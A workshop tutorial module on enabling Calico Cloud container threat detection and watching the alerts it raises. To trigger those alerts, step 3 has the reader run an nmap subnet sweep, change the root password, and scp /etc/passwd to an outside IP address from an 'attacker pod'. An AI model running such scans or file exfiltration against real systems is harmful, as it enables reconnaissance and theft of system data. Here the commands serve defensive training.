# Module 4 - Zero-Day Attacks Detection with Threat Defence

Calico Cloud provides a threat detection engine that analyzes observed file and process activity to detect known malicious and suspicious activity.

Our threat detection engine also monitors activity within the containers running in your clusters to detect suspicious behaviour and generate corresponding alerts. The threat detection engine monitors the following types of suspicious activity within containers:

- Access to sensitive system files and directories
- Defense evasion
- Discovery
- Execution
- Persistence
- Privilege escalation

1. Let's start by enabling the container threat detection feature.
   For this, go to the `Threat Defense` option in the left-hand menu of Calico Cloud and select `Container Threat Detection`.

2. If it is not enabled, you will see a page like this:

   ![enable](https://github.com/tigera-solutions/cc-aks-detect-block-network-attacks/assets/104035488/54014c62-cbef-4718-93fa-75390febb88a)

   Click on the Enable Container Threat Detection button, and you will see the following page:

   ![running](https://github.com/tigera-solutions/cc-aks-detect-block-network-attacks/assets/104035488/42906ad6-ced1-40a8-b817-4a4b5c740d08)

   Perfect! Now any suspicious activities will generate an alert. Let's try some.

   In other to see the results faster, execute the following on the cluster:

   ```bash
   kubectl -n tigera-runtime-security annotate daemonset runtime-reporter unsupported.operator.tigera.io/ignore="true"
   kubectl -n tigera-runtime-security get daemonset.apps/runtime-reporter -o yaml | sed 's/15m/1m/g' | kubectl apply -f -
   ```

3. Execute the following commands from the attacker pod (if you did quit from its shell, it got deleted. Create it again if it's the case.).

   ```bash
   apk update
   apk add nmap
   nmap -sn $(hostname -i)/24
   ```

   Wait a minute and look in the Calico Cloud UI in the `Threat Defense` > `Security Events`.

   Optionally, you can also try the following;

   ```bash
   passwd root
   scp -o ConnectTimeout=3 /etc/passwd goomba@198.13.47.158:/tmp/
   ```

   Wait another minute and look in the Calico Cloud UI in the `Threat Defense` > `Security Events` again.

   You should be able to see the following security events:

   ![security_events](https://github.com/tigera-solutions/cc-aks-implement-runtime-security/assets/104035488/612893b6-7a46-487d-bb4d-bc9876c5d302)

---

[:arrow_right: Module 5 - Quarantine Infected Workloads and Visualize KSPM](module-5-quarantine-kspm.md)  <br>

[:arrow_left: Module 3 - Configuring the Workload-Centric WAF](module-3-waf.md)  <br>

[:leftwards_arrow_with_hook: Back to Main](../README.md)  
